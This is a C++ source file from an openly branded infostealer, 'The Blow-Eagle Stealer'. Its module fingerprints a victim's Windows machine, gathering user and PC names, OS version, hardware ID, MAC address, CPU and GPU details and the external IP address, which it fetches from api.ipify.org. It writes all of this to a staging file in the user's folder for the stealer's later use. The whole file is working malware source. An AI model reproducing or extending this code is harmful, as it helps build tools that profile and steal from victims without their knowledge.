/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|													by: Nick_Vinesmoke											   |
|											https://github.com/Nick-Vinesmoke									   |
|									https://github.com/Nick-Vinesmoke/The-Blow-Eagle							   |
|==================================================================================================================|
*/

#include "../targets.h"
#include "../../config/config.h"

#include <windows.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <fstream>
#include <string.h>
#include <string>
#include <ctime>
#include <sstream>
#include <iphlpapi.h>
#include <curl\curl.h>
#include <tchar.h>
#include <intrin.h>
#include <dxgi.h>

#pragma comment(lib, "dxgi.lib")

#pragma comment(lib, "wbemuuid.lib")
#include <VersionHelpers.h>

#pragma warning(disable : 4996)

namespace global 
{
	std::string info = "";

	std::string logo = R"LOGO(|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗  |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝  |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░  |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░  |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗  |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝  |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|)LOGO";
}

/// <summary>
/// get User, Pc name, OS, Hwid , Mac, Time, IPs
/// </summary>
void GetGeneralInfo();

void CPU();

void GPU();

std::string GetCPUType();

std::string GetWindowsOSType();

void cursystem::GetSysInfo()
{
	printf("sys info\n");

	TCHAR string[UNLEN + 1];
	DWORD sizeit = UNLEN + 1;
	GetUserName((TCHAR*)string, &sizeit);
	std::wstring ws(string);
	std::string userName(ws.begin(), ws.end());

	std::string mainPath = "C:/Users/" + userName + config::path + "/System-Info/System-Info.txt";

	GetGeneralInfo();
	CPU();
	GPU();


	std::ofstream file(mainPath, std::ios::app);
	if (file.is_open())
	{
		file << global::logo << std::endl;
		file << global::info;
	}

	file.close();
}

size_t WriteCallbackInfo(char* contents, size_t size, size_t nmemb, std::string* output) {
	size_t totalSize = size * nmemb;
	output->append(contents, totalSize);
	return totalSize;
}

void GetGeneralInfo() 
{
	std::time_t currentTime = std::time(nullptr);

	// Convert the current time to a string
	std::string timeString = std::ctime(&currentTime);

	// Remove the newline character at the end of the string
	timeString.erase(timeString.find_last_not_of("\n") + 1);

	global::info += "Time and Date: " + timeString + '\n';

	TCHAR s[UNLEN + 1];
	DWORD sizethis = UNLEN + 1;
	GetUserName((TCHAR*)s, &sizethis);
	std::wstring ws(s);
	std::string userName(ws.begin(), ws.end());

	global::info += "User name: " + userName + '\n';

	TCHAR str[UNLEN + 1];
	DWORD sizethis1 = UNLEN + 1;
	GetComputerName((TCHAR*)str, &sizethis1);
	std::wstring ws1(str);
	std::string pcName(ws1.begin(), ws1.end());

	global::info += "PC name: " + pcName + '\n';


	global::info += "OS: " + GetWindowsOSType() + '\n';


    HW_PROFILE_INFO hwProfileInfo;
    GetCurrentHwProfile(&hwProfileInfo);
    std::wstring wstr(hwProfileInfo.szHwProfileGuid);
    std::string HWID(wstr.begin(), wstr.end());
    size_t end = std::size(HWID);
    HWID = HWID.substr(1, end - 2);

    global::info += "Hwid: " + HWID + '\n';

	IP_ADAPTER_INFO adapterInfo[16];
	DWORD bufferSize = sizeof(adapterInfo);

	DWORD result = GetAdaptersInfo(adapterInfo, &bufferSize);
	if (result == ERROR_BUFFER_OVERFLOW) {
		std::cerr << "Insufficient buffer size" << std::endl;
	}
	else if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to get adapter information" << std::endl;
	}

	PIP_ADAPTER_INFO adapter = adapterInfo;
	std::stringstream macAddress;

	for (; adapter != nullptr; adapter = adapter->Next) {
		if (adapter->AddressLength != 6) {
			continue;  // Skip non-physical adapters
		}
		macAddress << ":";
		for (DWORD i = 0; i < adapter->AddressLength; ++i) {
			if (i > 0) {
				macAddress << ":";
			}

			macAddress << std::hex << static_cast<int>(adapter->Address[i]);
		}
		macAddress << ":";
		break;
	}

	//std::cout << "MAC Address: " << macAddress.str() << std::endl;

	std::string mac = "";

	for (size_t i = 0; i < std::size(macAddress.str()); i++)
	{
		if (isdigit(macAddress.str()[i]) && macAddress.str()[i - 1] == ':' && macAddress.str()[i + 1] == ':')
		{
			mac += '0';
		}
		mac += macAddress.str()[i];
	}

	mac = mac.substr(1, std::size(mac) - 2);

	global::info += "MAC Address: " + mac + '\n';

	std::string ipAddress = "";


	CURL* curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallbackInfo);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);

		CURLcode res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			std::cerr << "Failed to retrieve IP address: " << curl_easy_strerror(res) << std::endl;
		}

		curl_easy_cleanup(curl);
	}
	
	global::info += "External IP Address: " + ipAddress + '\n';


}

std::string GetWindowsOSType() {

	float ret = 0.0;
	NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW osInfo;
	*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
	if (NULL != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof(osInfo);
		RtlGetVersion(&osInfo);
		ret = osInfo.dwMajorVersion;
	}
	return "Windows " + std::to_string(ret);

}

void CPU()
{
	// Get the CPU type
	std::string cpuType = GetCPUType();

	//std:: cout << "\n\nCPU Type: " + cpuType + '\n';
	global::info += "\n\nCPU Type: " + cpuType + '\n';

	// Get the number of CPU cores
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	DWORD numCores = sysInfo.dwNumberOfProcessors;
	global::info += "Number of CPU Cores: " + std::to_string(numCores) + '\n';
	//std::cout << "Number of CPU Cores: " << std::to_string(numCores) << '\n';

	// Get the maximum CPU frequency
	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		DWORD freqValue;
		DWORD freqSize = sizeof(freqValue);
		if (RegQueryValueEx(hKey, _T("~MHz"), NULL, NULL, reinterpret_cast<LPBYTE>(&freqValue), &freqSize) == ERROR_SUCCESS) {
			global::info += "Maximum CPU Frequency: " + std::to_string(freqValue) + " MHz\n";
		}

		RegCloseKey(hKey);
	}

}


std::string GetCPUType() 
{

	std::string cpuType;

    int cpuInfo[4] = { -1 };
    char cpuBrandString[0x40] = { 0 };

    // Check if the CPUID instruction is supported
    __cpuid(cpuInfo, 0x80000000);
    unsigned int nExIds = cpuInfo[0];

    // Get the CPU brand string
    for (unsigned int i = 0x80000000; i <= nExIds; ++i) {
        __cpuid(cpuInfo, i);

        if (i == 0x80000002)
            memcpy(cpuBrandString, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000003)
            memcpy(cpuBrandString + 16, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000004)
            memcpy(cpuBrandString + 32, cpuInfo, sizeof(cpuInfo));
    }

    cpuType = cpuBrandString;

    return cpuType;

}

void GPU() 
{
	global::info += "\n\n";

	IDXGIFactory* pFactory = nullptr;
	if (FAILED(CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&pFactory))) {
		std::cerr << "Failed to create DXGI Factory" << std::endl;
		return;
	}

	IDXGIAdapter* pAdapter = nullptr;
	UINT adapterIndex = 0;
	while (pFactory->EnumAdapters(adapterIndex, &pAdapter) != DXGI_ERROR_NOT_FOUND) {
		DXGI_ADAPTER_DESC adapterDesc;
		if (SUCCEEDED(pAdapter->GetDesc(&adapterDesc))) {
			global::info += "GPU " + std::to_string(adapterIndex + 1) + ":" + '\n';
			std::wstring ws(adapterDesc.Description);
			std::string str(ws.begin(), ws.end());
			global::info +="  Description: " + str + '\n';
			global::info += "  Dedicated Video Memory: " + std::to_string((adapterDesc.DedicatedVideoMemory / (1024 * 1024))) + " MB" + '\n';
			global::info += "  System Video Memory: " + std::to_string((adapterDesc.SharedSystemMemory / (1024 * 1024))) + " MB" + '\n';
			global::info += "  Memory Bus Width: " + std::to_string(adapterDesc.DedicatedVideoMemory / 8 )+ " bits" + '\n';

		}

		pAdapter->Release();
		pAdapter = nullptr;
		adapterIndex++;
	}

	pFactory->Release();
}